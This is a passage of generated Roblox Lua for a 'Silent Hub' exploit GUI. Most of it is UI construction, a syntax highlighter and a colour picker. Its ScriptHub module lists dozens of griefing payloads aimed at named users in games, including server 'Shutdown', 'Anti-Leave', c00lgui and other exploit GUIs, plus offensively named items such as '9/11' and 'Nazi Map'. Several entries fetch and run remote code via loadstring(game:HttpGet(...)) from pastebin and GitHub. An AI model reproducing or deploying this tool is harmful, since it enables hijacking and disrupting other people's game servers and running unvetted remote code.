G2L["d1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow.Frame
G2L["d2"] = Instance.new("Frame", G2L["cd"]);
G2L["d2"]["BorderSizePixel"] = 0;
G2L["d2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d2"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["d2"]["Position"] = UDim2.new(0, 2, 0, 8);
G2L["d2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ColorSpaceFrame
G2L["d3"] = Instance.new("Frame", G2L["71"]);
G2L["d3"]["BorderSizePixel"] = 0;
G2L["d3"]["BackgroundColor3"] = Color3.fromRGB(97, 97, 97);
G2L["d3"]["ClipsDescendants"] = true;
G2L["d3"]["Size"] = UDim2.new(0, 222, 0, 202);
G2L["d3"]["Position"] = UDim2.new(1, -261, 0, 4);
G2L["d3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d3"]["Name"] = [[ColorSpaceFrame]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ColorSpaceFrame.ColorSpace
G2L["d4"] = Instance.new("ImageLabel", G2L["d3"]);
G2L["d4"]["BorderSizePixel"] = 0;
G2L["d4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d4"]["Image"] = [[rbxassetid://1072518406]];
G2L["d4"]["Size"] = UDim2.new(0, 220, 0, 200);
G2L["d4"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["d4"]["Name"] = [[ColorSpace]];
G2L["d4"]["Position"] = UDim2.new(0, 1, 0, 1);


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ColorSpaceFrame.ColorSpace.Scope
G2L["d5"] = Instance.new("Frame", G2L["d4"]);
G2L["d5"]["BorderSizePixel"] = 0;
G2L["d5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d5"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["d5"]["Position"] = UDim2.new(0, 210, 0, 190);
G2L["d5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d5"]["Name"] = [[Scope]];
G2L["d5"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ColorSpaceFrame.ColorSpace.Scope.Line
G2L["d6"] = Instance.new("Frame", G2L["d5"]);
G2L["d6"]["BorderSizePixel"] = 0;
G2L["d6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d6"]["Size"] = UDim2.new(0, 20, 0, 2);
G2L["d6"]["Position"] = UDim2.new(0, 0, 0, 9);
G2L["d6"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d6"]["Name"] = [[Line]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ColorSpaceFrame.ColorSpace.Scope.Line
G2L["d7"] = Instance.new("Frame", G2L["d5"]);
G2L["d7"]["BorderSizePixel"] = 0;
G2L["d7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d7"]["Size"] = UDim2.new(0, 2, 0, 20);
G2L["d7"]["Position"] = UDim2.new(0, 9, 0, 0);
G2L["d7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d7"]["Name"] = [[Line]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.Preview
G2L["d8"] = Instance.new("Frame", G2L["71"]);
G2L["d8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d8"]["Size"] = UDim2.new(0, 35, 1, -245);
G2L["d8"]["Position"] = UDim2.new(1, -260, 0, 211);
G2L["d8"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["d8"]["Name"] = [[Preview]];


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.Content.ColorLine
G2L["d9"] = Instance.new("ImageLabel", G2L["71"]);
G2L["d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d9"]["Image"] = [[rbxassetid://1072518502]];
G2L["d9"]["Size"] = UDim2.new(0, 13, 0, 200);
G2L["d9"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["d9"]["Name"] = [[ColorLine]];
G2L["d9"]["Position"] = UDim2.new(1, -30, 0, 5);


-- StarterGui.Silent Hub.UI.Open
G2L["da"] = Instance.new("TextButton", G2L["2"]);
G2L["da"]["BorderSizePixel"] = 0;
G2L["da"]["TextSize"] = 14;
G2L["da"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["da"]["BackgroundColor3"] = Color3.fromRGB(51, 51, 51);
G2L["da"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["da"]["Size"] = UDim2.new(0, 75, 0, 30);
G2L["da"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["da"]["Text"] = [[Open]];
G2L["da"]["Name"] = [[Open]];
G2L["da"]["Position"] = UDim2.new(0, -75, 0.75, 0);


-- StarterGui.Silent Hub.UI.Open.UICorner
G2L["db"] = Instance.new("UICorner", G2L["da"]);
G2L["db"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.Scripts
G2L["dc"] = Instance.new("Folder", G2L["1"]);
G2L["dc"]["Name"] = [[Scripts]];


-- StarterGui.Silent Hub.Scripts.SyntaxHighlighting
G2L["dd"] = Instance.new("ModuleScript", G2L["dc"]);
G2L["dd"]["Name"] = [[SyntaxHighlighting]];


-- StarterGui.Silent Hub.Scripts.LocalScript
G2L["de"] = Instance.new("LocalScript", G2L["dc"]);



-- StarterGui.Silent Hub.Scripts.ScriptHub
G2L["df"] = Instance.new("ModuleScript", G2L["dc"]);
G2L["df"]["Name"] = [[ScriptHub]];


-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
    local ModuleState = G2L_MODULES[Module];
    if ModuleState then
        if not ModuleState.Required then
            ModuleState.Required = true;
            ModuleState.Value = ModuleState.Closure();
        end
        return ModuleState.Value;
    end;
    return G2L_REQUIRE(Module);
end

G2L_MODULES[G2L["dd"]] = {
Closure = function()
    local script = G2L["dd"];local highlighter = {}
local keywords = {
	lua = {
		"and", "break", "or", "else", "elseif", "if", "then", "until", "repeat", "while", "do", "for", "in", "end",
		"local", "return", "function", "export"
	},
	rbx = {
		"game", "workspace", "script", "math", "string", "table", "task", "wait", "select", "next", "Enum",
		"error", "warn", "tick", "assert", "shared", "loadstring", "tonumber", "tostring", "type",
		"typeof", "unpack", "print", "Instance", "CFrame", "Vector3", "Vector2", "Color3", "UDim", "UDim2", "Ray", "BrickColor",
		"OverlapParams", "RaycastParams", "Axes", "Random", "Region3", "Rect", "TweenInfo",
		"collectgarbage", "not", "utf8", "pcall", "xpcall", "_G", "setmetatable", "getmetatable", "os", "pairs", "ipairs"
	},
	operators = {
		"#", "+", "-", "*", "%", "/", "^", "=", "~", "=", "<", ">", ",", ".", "(", ")", "{", "}", "[", "]", ";", ":"
	}
}

local colors = {
	numbers = Color3.fromRGB(255, 198, 0),
	boolean = Color3.fromRGB(214, 128, 23),
	operator = Color3.fromRGB(232, 210, 40),
	lua = Color3.fromRGB(160, 87, 248),
	rbx = Color3.fromRGB(146, 180, 253),
	str = Color3.fromRGB(56, 241, 87),
	comment = Color3.fromRGB(103, 110, 149),
	null = Color3.fromRGB(79, 79, 79),
	call = Color3.fromRGB(130, 170, 255),
	self_call = Color3.fromRGB(227, 201, 141),
	local_color = Color3.fromRGB(199, 146, 234),
	function_color = Color3.fromRGB(241, 122, 124),
	self_color = Color3.fromRGB(146, 134, 234),
	local_property = Color3.fromRGB(129, 222, 255),
}

local function createKeywordSet(keywords)
	local keywordSet = {}
	for _, keyword in ipairs(keywords) do
		keywordSet[keyword] = true
	end
	return keywordSet
end

local luaSet = createKeywordSet(keywords.lua)
local rbxSet = createKeywordSet(keywords.rbx)
local operatorsSet = createKeywordSet(keywords.operators)

local function getHighlight(tokens, index)
	local token = tokens[index]

	if colors[token .. "_color"] then
		return colors[token .. "_color"]
	end

	if tonumber(token) then
		return colors.numbers
	elseif token == "nil" then
		return colors.null
	elseif token:sub(1, 2) == "--" then
		return colors.comment
	elseif operatorsSet[token] then
		return colors.operator
	elseif luaSet[token] then
		return colors.rbx
	elseif rbxSet[token] then
		return colors.lua
	elseif token:sub(1, 1) == "\"" or token:sub(1, 1) == "\'" then
		return colors.str
	elseif token == "true" or token == "false" then
		return colors.boolean
	end

	if tokens[index + 1] == "(" then
		if tokens[index - 1] == ":" then
			return colors.self_call
		end

		return colors.call
	end

	if tokens[index - 1] == "." then
		if tokens[index - 2] == "Enum" then
			return colors.rbx
		end

		return colors.local_property
	end
end

function highlighter.run(source)
	local tokens = {}
	local currentToken = ""

	local inString = false
	local inComment = false
	local commentPersist = false

	for i = 1, #source do
		local character = source:sub(i, i)

		if inComment then
			if character == "\n" and not commentPersist then
				table.insert(tokens, currentToken)
				table.insert(tokens, character)
				currentToken = ""

				inComment = false
			elseif source:sub(i - 1, i) == "]]" and commentPersist then
				currentToken ..= "]"

				table.insert(tokens, currentToken)
				currentToken = ""

				inComment = false
				commentPersist = false
			else
				currentToken = currentToken .. character
			end
		elseif inString then
			if character == inString and source:sub(i-1, i-1) ~= "\\" or character == "\n" then
				currentToken = currentToken .. character
				inString = false
			else
				currentToken = currentToken .. character
			end
		else
			if source:sub(i, i + 1) == "--" then
				table.insert(tokens, currentToken)
				currentToken = "-"
				inComment = true
				commentPersist = source:sub(i + 2, i + 3) == "[["
			elseif character == "\"" or character == "\'" then
				table.insert(tokens, currentToken)
				currentToken = character
				inString = character
			elseif operatorsSet[character] then
				table.insert(tokens, currentToken)
				table.insert(tokens, character)
				currentToken = ""
			elseif character:match("[%w_]") then
				currentToken = currentToken .. character
			else
				table.insert(tokens, currentToken)
				table.insert(tokens, character)
				currentToken = ""
			end
		end
	end

	table.insert(tokens, currentToken)

	local highlighted = {}

	for i, token in ipairs(tokens) do
		local highlight = getHighlight(tokens, i)

		if highlight then
			local syntax = string.format("<font color = \"#%s\">%s</font>", highlight:ToHex(), token:gsub("<", "&lt;"):gsub(">", "&gt;"))

			table.insert(highlighted, syntax)
		else
			table.insert(highlighted, token)
		end
	end

	return table.concat(highlighted)
end

return highlighter
end;
};
G2L_MODULES[G2L["df"]] = {
Closure = function()
    local script = G2L["df"];--Hub
--[[
{name = "MODULE NAME", module = "REQUIRE", args = {"USERNAME"}},
]]
local module = {
	Scripts = {
		{name = "Infinite Yield", module = "require(16125188456)", args = {"Username"}},
		{name = "Spectrum Glitcher [R6]", module = "require(16159491737).load", args = {"Username"}},
		{name = "Reality Glitcher [R6]", module = "require(16160304128).noxd", args = {"Username"}},
		{name = "Pixel Glitcher [R6]", module = "require(16160318494).MPG", args = {"Username"}},
		{name = "Galaxy Glitcher [R6]", module = "require(16160335930):GalaxyGlitcher", args = {"Username"}},
		{name = "MLG Gun [R6]", module = "require(2850994438).load", args = {"Username"}},
		{name = "Pan [R6]", module = "require(2965793312):Fire", args = {"Username"}},
		{name = "Red Sword [R6]", module = "require(2845906776).ooga", args = {"Username"}},
		{name = "Mr Pixels [R6]", module = "require(2995020929):Fire", args = {"oof", "Username"}},
		{name = "Rainbow Infinite [R6]", module = "require(4688842535)", args = {"Username"}},
		{name = "Sans [R6]", module = "require(6031862039).eliza", args = {"Username"}},
		{name = "Omen [R6]", module = "require(8824302289).omen", args = {"Username"}},
		{name = "SHOOTA [R6]", module = "require(2826823504):Run", args = {"Username", "i baked you a pie"}},
		{name = "Topkeke Arms 2.0 [R6]", module = "require(2851024356).load", args = {"Username"}},
		{name = "Mr. Byebye [R6]", module = "require(2595582545).mbye", args = {"Username"}},
		{name = "RunicTunes [R6]", module = "require(2992183083):Fire", args = {"Username"}},
		{name = "Horse [R6]", module = "require(2992217896):Fire", args = {"Username"}},
		{name = "Ban Hammer [R6]", module = "require(2992280097):Fire", args = {"Username"}},
		{name = "F3X Building Tools", module = "require(2571067295).load", args = {"Username"}},
		{name = "John Doe [R6]", module = "require(2845929020).ooga", args = {"Username"}},
		{name = "True Rainbow Ultima [R6]", module = "require(5062394049).acid", args = {"Username"}},
		{name = "Star Glitcher [R6]", module = "require(15192227154).LR", args = {"Username"}},
		{name = "Nebula Chara [R6]", module = "require(5091614761).load", args = {"Username"}},
		{name = "Excavator", module = "require(16829113909)", args = {"Username"}},
		{name = "Silencer Glitcher", module = "require(5091625839):CoolGlitch", args = {"Username"}},
		{name = "Dual Ultima [R6]", module = "require(2946060158):Fire", args = {"Username", "hack"}},
		{name = "Bird Wings [R6]", module = "require(115442766376473).BirdWings", args = {"Username"}},
		{name = "Suicide Gun [R6]", module = "require(3023538289).load", args = {"Username"}},
		{name = "Shutdown", module = "loadstring(game:HttpGet('https://pastebin.com/raw/VWSzjd9q'))()"},
		{name = "Anti-Leave", module = "require(79957576084104)"},
		{name = "Toadroast", module = "require(101923055217892).load()"},
		{name = "Memelord [R6]", module = "require(6583586016).load", args = {"Username"}},
		{name = "Lua Hammer [R6]", module = "require(11957419646):Fire", args = {"Username", "lua"}},
		{name = "Raining Tacos", module = "loadstring(game:HttpGet('https://raw.githubusercontent.com/hyperionhax/FDScripts/refs/heads/main/Raining%20Tacos'))()"},
		{name = "Goner [R6]", module = "require(4513235536).G", args = {"Username"}},
		{name = "C4 Tool", module = "require(0x1767bf813)", args = {"Username"}},
		{name = "The Sun Is A Deadly Laser [R6]", module = "require(4528360948):Fire", args = {'Username', 'hack'}},
		{name = "Gravity Hammer [R6]", module = "require(4702851632).load", args = {"Username"}},
		{name = "Lightning Cannon [R6]", module = "require(12750218971)", args = {"Username"}},
		{name = "Reality Orb [R6]", module = "require(4780399515).load", args = {"Username"}},
		{name = "Noot Noot", module = "loadstring(game:HttpGet('https://raw.githubusercontent.com/hyperionhax/FDScripts/refs/heads/main/Noot%20Noot'))()"},
		{name = "c00lkiddify", module = "loadstring(game:HttpGet('https://raw.githubusercontent.com/hyperionhax/FDScripts/refs/heads/main/c00lify'))()"},
		{name = "Hacker X [R6]", module = "require(4722260429).load", args = {"Username"}},
		{name = "Felipe Ascension [R6]", module = "require(5605396200):load", args = {"Username", "Felipe"}},
		{name = "Doge Army", module = "require(5115249013).fehack", args = {"Username"}},
		{name = "9/11", module = "require(5040700729).load", args = {"Username"}},
		{name = "Disco Fog", module = "require(128526890361388).load()"},
		{name = "Bomb Vest [R6]", module = "require(0x49731b7f).load", args = {"Username"}},
		{name = "Grab Knife V4 [R6]", module = "require(93444499562289).DE", args = {"Username"}},
		{name = "Neptunian V [R6]", module = "require(82295806676393).Neptunian", args = {"Username"}},
		{name = "Sledgehammer [R6]", module = "require(8038037940).CLoad", args = {"Username"}},
		{name = "Dev-Uzi [R6]", module = "require(13612021114):Fire", args = {"Username", "dev-uzi"}},
		{name = "Xester [R6]", module = "require(6099241563).load", args = {"Username"}},
		{name = "Pandora [R6]", module = "require(13260588937).p11", args = {"Username"}},
		{name = "Last Star [R6]", module = "require(17346979612).load", args = {"Username"}},
		{name = "Swat Blasio [R6]", module = "require(5054849946):Fire", args = {'Username', 'test'}},
	},
	Guis = {
		{name = "Dex", module = "require(14572394952)", args = {"Username"}},
		{name = "c00lgui by team c00lkidd", module = "require(14125553864):Fire", args = {"Username", "c00lkidd"}},
		{name = "T0PK3K", module = "require(0x342D5F0DA)", args = {"Username"}},
		{name = "Ro-Xploit 4.0", module = "require(13951201425):Fire", args = {"Username", "roxploit"}},
		{name = "YourMom GUI", module = "require(120133869038302).YourMom", args = {"Username"}},
		{name = "Stratosphere", module = "require(6535776034).load", args = {"Username"}},
	},
	Maps = {
		{name = "Spongebob", module = "require(3164497408).spongebob"},
		{name = "KFC", module = "require(2870590559).kfc"},
		{name = "Clockwork Arena", module = "require(13887518057)()"},
		{name = "Happy Home in Robloxia", module = "require(87761798305469).loadmap()"},
		{name = "Natural Disaster Survival", module = "require(14704225060).nds()"},
		{name = "Sword Fights on the Heights IV", module = "require(17037307513).Start()"},
		{name = "Sword Fights on the Heights Original", module = "require(84779642132074).loadmap()"},
		{name = "Roblox HQ", module = "require(17040705474).Start()"},
		{name = "Club Noxious", module = "require(16690516036).Start()"},
		{name = "Clocktest Remastered", module = "require(17041089596).Start()"},
		{name = "Nazi Map", module = "require(139666139485072).load", args = {"Username"}},
		{name = "Prison Life", module = "require(14314506567).Load()"},
		{name = "Redwood Prison", module = "require(3161149041+1).redwood()"},
		{name = "McDonalds", module = "require(3168737443).load", args = {"Username"}},
		{name = "GMOD City", module = "require(138251895601289).GmodCity()"},
		{name = "Walmart", module = "require(6763551855).map()"},
		{name = "Five Nights at Freddy's", module = "require(12070820190).fnaf1()"},
		{name = "Brookhaven", module = "require(110191289672557).brookhaven()"},
	}
}

return module

end;
};
-- StarterGui.Silent Hub.UI.Interface.UIDrag
local function C_4()
local script = G2L["4"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_4);
-- StarterGui.Silent Hub.UI.ColorPick.LocalScript
local function C_6c()
local script = G2L["6c"];
	local ColorPicker do
		ColorPicker = {}
		
		ColorPicker.new = function()
			local newMt = setmetatable({},{})
			
			local pickerGui = script.Parent.ColorPicker
			local pickerTopBar = pickerGui.TopBar
			local pickerFrame = pickerGui.Content
			local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
			local ColorLine = pickerFrame.ColorLine
			local previewFrame = pickerFrame.Preview
			local basicColorsFrame = pickerFrame.BasicColors
			local customColorsFrame = pickerFrame.CustomColors
			local okButton = pickerFrame.Ok
			local cancelButton = pickerFrame.Cancel
			local closeButton = pickerTopBar.Close
	
			local colorScope = colorSpace.Scope
			local colorArrow = pickerFrame.ArrowFrame.Arrow
	
			local hueInput = pickerFrame.Hue.Input
			local satInput = pickerFrame.Sat.Input
			local valInput = pickerFrame.Val.Input
	
			local redInput = pickerFrame.Red.Input
			local greenInput = pickerFrame.Green.Input
			local blueInput = pickerFrame.Blue.Input
	
			local user = game:GetService("UserInputService")
			local mouse = game:GetService("Players").LocalPlayer:GetMouse()
	
			local hue,sat,val = 0,0,1
			local red,green,blue = 1,1,1
			local chosenColor = Color3.new(50/255,50/255,50/255)
	
			local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
			local customColors = {}
	
			local function updateColor(noupdate)
				local relativeX,relativeY,relativeLineY = 219 - hue*219, 199 - sat*199, 199 - val*199
				local hsvColor = Color3.fromHSV(hue,sat,val)
		
				if noupdate == 2 or not noupdate then
					hueInput.Text = tostring(math.ceil(359*hue))
					satInput.Text = tostring(math.ceil(255*sat))
					valInput.Text = tostring(math.floor(255*val))
				end
				if noupdate == 1 or not noupdate then
					redInput.Text = tostring(math.floor(255*red))
					greenInput.Text = tostring(math.floor(255*green))
					blueInput.Text = tostring(math.floor(255*blue))
				end
		
				chosenColor = Color3.new(red,green,blue)
		
				colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
				ColorLine.ImageColor3 = Color3.fromHSV(hue,sat,1)
				colorArrow.Position = UDim2.new(0,-2,0,relativeLineY-4)
				previewFrame.BackgroundColor3 = chosenColor
				
				newMt.Color = chosenColor
				if newMt.Changed then newMt:Changed(chosenColor) end
			end
	
			local function colorSpaceInput()
				local relativeX = mouse.X - colorSpace.AbsolutePosition.X
				local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y
					
				if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
				if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end
					
				hue = (219 - relativeX)/219
				sat = (199 - relativeY)/199
		
				local hsvColor = Color3.fromHSV(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
		
				updateColor()
			end
	
			local function ColorLineInput()
				local relativeY = mouse.Y - ColorLine.AbsolutePosition.Y
		
				if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	
		
				val = (199 - relativeY)/199
		
				local hsvColor = Color3.fromHSV(hue,sat,val)
				red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
		
				updateColor()
			end
	
			local function hookButtons(frame,func)
				frame.ArrowFrame.Up.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						frame.ArrowFrame.Up.BackgroundTransparency = 0.5
					elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
						local releaseEvent,runEvent
				
						local startTime = tick()
						local pressing = true
						local startNum = tonumber(frame.Text)
				
						if not startNum then return end
				
						releaseEvent = user.InputEnded:Connect(function(input)
							if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
							releaseEvent:Disconnect()
							pressing = false
						end)
				
						startNum = startNum + 1
						func(startNum)
						while pressing do
							if tick()-startTime > 0.3 then
								startNum = startNum + 1
								func(startNum)
							end
							wait(0.1)
						end
					end
				end)
		
				frame.ArrowFrame.Up.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						frame.ArrowFrame.Up.BackgroundTransparency = 1
					end
				end)
		
				frame.ArrowFrame.Down.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						frame.ArrowFrame.Down.BackgroundTransparency = 0.5
					elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
						local releaseEvent,runEvent
				
						local startTime = tick()
						local pressing = true
						local startNum = tonumber(frame.Text)
				
						if not startNum then return end
				
						releaseEvent = user.InputEnded:Connect(function(input)
							if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
							releaseEvent:Disconnect()
							pressing = false
						end)
				
						startNum = startNum - 1
						func(startNum)
						while pressing do
							if tick()-startTime > 0.3 then
								startNum = startNum - 1
								func(startNum)
							end
							wait(0.1)
						end
					end
				end)
		
				frame.ArrowFrame.Down.InputEnded:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement then
						frame.ArrowFrame.Down.BackgroundTransparency = 1
					end
				end)
			end
	
			colorSpace.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					local releaseEvent,mouseEvent
			
					releaseEvent = user.InputEnded:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	            		releaseEvent:Disconnect()
						mouseEvent:Disconnect()
					end)
			
					mouseEvent = user.InputChanged:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							colorSpaceInput()
						end
					end)
			
					colorSpaceInput()
				end
			end)
	
			ColorLine.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					local releaseEvent,mouseEvent
			
					releaseEvent = user.InputEnded:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	        		    releaseEvent:Disconnect()
						mouseEvent:Disconnect()
					end)
			
					mouseEvent = user.InputChanged:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							ColorLineInput()
						end
					end)
			
					ColorLineInput()
				end
			end)
	
			local function updateHue(str)
				local num = tonumber(str)
				if num then
					hue = math.clamp(math.floor(num),0,359)/359
					local hsvColor = Color3.fromHSV(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
					hueInput.Text = tostring(hue*359)
					updateColor(1)
				end
			end
			hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)
	
			local function updateSat(str)
				local num = tonumber(str)
				if num then
					sat = math.clamp(math.floor(num),0,255)/255
					local hsvColor = Color3.fromHSV(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
					satInput.Text = tostring(sat*255)
					updateColor(1)
				end
			end
			satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)
	
			local function updateVal(str)
				local num = tonumber(str)
				if num then
					val = math.clamp(math.floor(num),0,255)/255
					local hsvColor = Color3.fromHSV(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
					valInput.Text = tostring(val*255)
					updateColor(1)
				end
			end
			valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)
			
			local function updateRed(str)
				local num = tonumber(str)
				if num then
					red = math.clamp(math.floor(num),0,255)/255
					local newColor = Color3.new(red,green,blue)
					hue,sat,val = Color3:ToHSV(newColor)
					redInput.Text = tostring(red*255)
					updateColor(2)
				end
			end
			redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)
			
			local function updateGreen(str)
				local num = tonumber(str)
				if num then
					green = math.clamp(math.floor(num),0,255)/255
					local newColor = Color3.new(red,green,blue)
					hue,sat,val = Color3:ToHSV(newColor)
					greenInput.Text = tostring(green*255)
					updateColor(2)
				end
			end
			greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)
			
			local function updateBlue(str)
				local num = tonumber(str)
				if num then
					blue = math.clamp(math.floor(num),0,255)/255
					local newColor = Color3.new(red,green,blue)
					hue,sat,val = Color3:ToHSV(newColor)
					blueInput.Text = tostring(blue*255)
					updateColor(2)
				end
			end
			blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)
			
			local colorChoice = Instance.new("TextButton")
			colorChoice.Name = "Choice"
			colorChoice.Size = UDim2.new(0,25,0,18)
			colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
			colorChoice.Text = ""
			colorChoice.AutoButtonColor = false
			
			local row = 0
			local column = 0
			for i,v in pairs(basicColors) do
				local newColor = colorChoice:Clone()
				newColor.BackgroundColor3 = v
				newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)
				
				newColor.MouseButton1Click:Connect(function()
					red,green,blue = v.r,v.g,v.b
					local newColor = Color3.new(red,green,blue)
					hue,sat,val = Color3:ToHSV(newColor)
					updateColor()
				end)	
				
				newColor.Parent = basicColorsFrame
				column = column + 1
				if column == 6 then row = row + 1 column = 0 end
			end
			
			row = 0
			column = 0
			for i = 1,12 do
				local color = customColors[i] or Color3.new(0,0,0)
				local newColor = colorChoice:Clone()
				newColor.BackgroundColor3 = color
				newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)
				
				newColor.MouseButton1Click:Connect(function()
					local curColor = customColors[i] or Color3.new(0,0,0)
					red,green,blue = curColor.r,curColor.g,curColor.b
					hue,sat,val = Color3:ToHSV(curColor)
					updateColor()
				end)
				
				newColor.MouseButton2Click:Connect(function()
					customColors[i] = chosenColor
					newColor.BackgroundColor3 = chosenColor
				end)
				
				newColor.Parent = customColorsFrame
				column = column + 1
				if column == 6 then row = row + 1 column = 0 end
			end
			
			pickerTopBar.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					local releaseEvent,mouseEvent
